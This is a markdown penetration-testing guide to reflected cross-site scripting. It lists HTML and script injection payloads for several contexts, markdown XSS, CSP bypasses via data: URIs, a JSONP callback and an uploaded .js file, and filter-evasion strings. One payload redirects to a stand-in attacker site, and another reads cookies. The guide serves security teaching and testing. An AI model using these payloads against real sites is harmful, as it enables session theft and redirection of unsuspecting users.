# Reflected XSS Testing Guide

This guide provides examples and techniques for identifying and exploiting **Reflected Cross-Site Scripting (XSS)** vulnerabilities during penetration testing.

---

## 🔄 Reflected XSS

Reflected XSS occurs when user input is **immediately echoed** back by the server without proper sanitization. It does **not get stored** on the server, and works when a victim clicks a **malicious link**.

---

### 🧪 HTML Injection Test

```html
<!-- Injects HTML to test for reflected XSS -->
"><h1>test123</h1>
```
This test checks if the application reflects user input as raw HTML, potentially leading to script injection.

---

### 🧨 XSS Payload Examples

```html
<script>alert(1)</script> <!-- Alert box -->
<script>print()</script> <!-- Print the page -->
<script>prompt('Hello')</script> <!-- Prompt box -->
<img src=x onmouseover=alert('xss')> <!-- Triggers alert on hover -->
```

---

### 💡 Different Injection Approaches

#### ✅ Combine HTML + Script Injection
```html
"><u>test123<script>alert('basic-xss')</script>
"><u>test123<script>alert('basic-xss');//</script>
```

#### 🔗 HTML Injection via Links
```html
<a href="https://www.example.com">test123</a>
<img src="x" onerror="window.location.href='https://attacker-website/'">
<script>alert(window.location);</script> <!-- Alert full URL -->
<script>window.location.href='https://www.google.com';</script>
```

#### 🔔 XSS via Malicious Links
```html
<a href="javascript:alert('xss-link')">test123</a>
<iframe src="javascript:alert('XSS')">test123</iframe>
<h1><u onmouseover="alert('XSS')">test123</u></h1>
<object data="data:text/html,<script>alert('xss')</script>"></object>
<object data="data:text/html,<h1>test123</h1>"></object>
<script src="data:text/javascript,alert(1337)"></script>
```

---

## 🔍 Escaping Contexts

Escape different HTML contexts to test how injected payloads are rendered.

**Input Context**
```html
"><u>test123 
test123"> 
"><u>test123<script>alert('xss')</script>
```

**`textarea` Context**
```html
test123</textarea><img src=x onerror=alert('xss')>
```

**`title` Context**
```html
test123</title><img src=1 onerror=alert('xss')>
```

**`style` Context**
```html
test123</style><img src=x onmouseover=alert(document.domain)>
```

**JavaScript Variable Context**
```js
test123';alert('xss');//
```

---

## 📦 Content-Type Based Injection

When XSS payloads are interpreted based on response content type.

**HTTP Request**
```http
GET /content-type/check.php?username=test123 HTTP/1.1
```

**HTTP Response**
```http
Content-Type: text/html; charset=UTF-8
```

**Payload**
```js
/content-type/check.php?username=<u>test123"><a href=javascript:alert(1)>test123
```

---

## 📝 XSS in Markdown

### Basic XSS Payload
```md
[xss link](javascript:alert(document.domain))
```

### Using Filter Bypass Payloads
Refer to: [Markdown XSS Payloads](https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt)

```md
[test123](https://www.google.com"onerror=alert``)
[test123](https://www.google.com"onmouseover=alert``)
[test123](https://www.google.com"onclick=alert``)
```

### Markdown Image Injection
You can test payloads via image URLs.
```md
![test](https://website.com/images/logo.svg1"onerror=alert``)
![test](https://website.com/images/logo.svg1"onerror=alert();//)
![test123](https://website.com/images/logo.svg"onmouseover=alert(1);//)
```
To extract the image address, right-click the image and choose Copy `image address`.

---

## Content Security Policy (CSP) Overview

**Content Security Policy (CSP)** is a security standard to prevent various attacks including Cross-Site Scripting (XSS) by restricting the sources from which content like scripts, images, or styles can be loaded.

### CSP Delivery Methods

- **HTTP Header:**  
  Sent from the server to the browser:  
  ```http
  Content-Security-Policy: ...
  ```

- **HTML Meta Tag:**
  Declared in the <head> section of the HTML document:
  ```html
  <meta http-equiv="Content-Security-Policy" content="...">
  ```

### CSP Directives
| Directive         | Description                                                                                   |
| ----------------- | --------------------------------------------------------------------------------------------- |
| `default-src`     | Sets the default policy for loading content when no other directive is specified.             |
| `script-src`      | Defines valid sources for JavaScript.                                                         |
| `child-src`       | Defines sources for web workers and nested browsing contexts like `iframe`, `frame`, `embed`. |
| `frame-src`       | Defines valid sources for frames.                                                             |
| `frame-ancestors` | Specifies valid parents that may embed the content via `<frame>` or `<iframe>`.               |
| `img-src`         | Defines valid image sources.                                                                  |
| `object-src`      | Defines valid sources for the `<object>`, `<embed>`, and `<applet>` elements.                 |
| `base-uri`        | Restricts the URLs that can be used in a document's `<base>` element.                         |
| `report-uri`      | Specifies the location where the browser should send reports about policy violations.         |
| `sandbox`         | Applies restrictions to a page, similar to using the sandbox attribute on iframes.            |

---

### CSP Source Values
| Value             | Description                                                     |
| ----------------- | --------------------------------------------------------------- |
| `'none'`          | Disallow all content sources.                                   |
| `'self'`          | Allow content only from the same origin (excluding subdomains). |
| `'unsafe-inline'` | Allow inline scripts or styles (not recommended).               |
| `'unsafe-eval'`   | Allow use of `eval()` (not recommended).                        |
| `https:`          | Allow content from HTTPS sources only.                          |
| `<host-source>`   | Allow content from a specific host or domain.                   |
| `data:`           | Allow data URIs (e.g., Base64 images).                          |
| `blob:`           | Allow JavaScript-generated Blob URIs.                           |

---

### CSP Example
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://www.site.com;">
```
- `default-src 'self'`: All resources must be loaded from the same origin.
- `img-src https://www.site.com`: Images are only allowed from `https://www.site.com`.

---

### Bypassing CSP Mechanisms
**1. CSP data: URI Bypass**

If the CSP allows the `data:` scheme, you can execute JavaScript like this:

**Example Header:**
```http
Content-Security-Policy: script-src 'self' https://website.com data:
```

**Payload:**
```html
<script src="data:text/javascript,alert(1337)"></script>
```
This works because `script-src` allows `data:` URIs, letting an attacker inject JavaScript via `data:` URL.

---

**2. CSP JSONP Bypass**

- Steps:
    - Open DevTools → Network
    - Navigate to `/csp-jsonp/`
    - Inspect response headers:
    ```http
    Content-Security-Policy: script-src 'self' https://website.com https://www.google.com https://www.youtube.com
    ```

**YouTube JSONP Endpoint Example:**
```html
<script src="https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=LfQ4-VLjhhQ&callback=alert(1)"></script>
```
Since YouTube is an allowed script source, and their JSONP endpoint allows `callback=`, we can inject our own function such as `alert(1)`.

---

**3. CSP File Upload Bypass**
Scenario: CSP only allows `script-src 'self'`.

- Steps:
    1. Upload a file named `image.png.js`:
    ```http
    POST /csp-upload/profile.php HTTP/1.1
    Content-Disposition: form-data; name="file"; filename="image.png.js"
    Content-Type: image/png

    --Data--
    ```
    2. Refresh the upload page. The uploaded JS file URL may be:
    ```http
    https://npzp98h0.eu2.ctfio.com/csp-upload/uploads/6eeee08bc3c82983852fb8fd3b538cd7.js
    ```
    3. Modify the file content to include a payload:
    ```js
    alert(1);
    document.cookie;
    ```
    4. Inject the payload into a comment field or HTML:
    ```html
    <script src="https://npzp98h0.eu2.ctfio.com/csp-upload/uploads/6eeee08bc3c82983852fb8fd3b538cd7.js"></script>
    ```
    This bypass works because the uploaded file has a `.js` extension and can be loaded by the browser as a script from the same origin.

---

## Filter Bypasses

### Filter: Script Tags (Case Sensitivity)
```html
<ScripT>alert(1)</script>
sript<ImG src=x onerror=alert()>
```

### Filter: Script Tags (Second Occurrence)
```html
<ScripT>alert(1)</script><ScripT>alert(1)</script>
```

### Filter: Script Tags
```html
<u onmouseover=alert(1);//>test123
```

### Filter: Script Tags in Attributes
```html
<iframe src=javascript:alert();></iframe>
<a href=javascript:alert(2)>click_me</a>
```

### Filter: All Tags (Tagless Output – Pure Text Rendering)
```html
<scr<script>ipt>alert()</scr</script>ipt>
```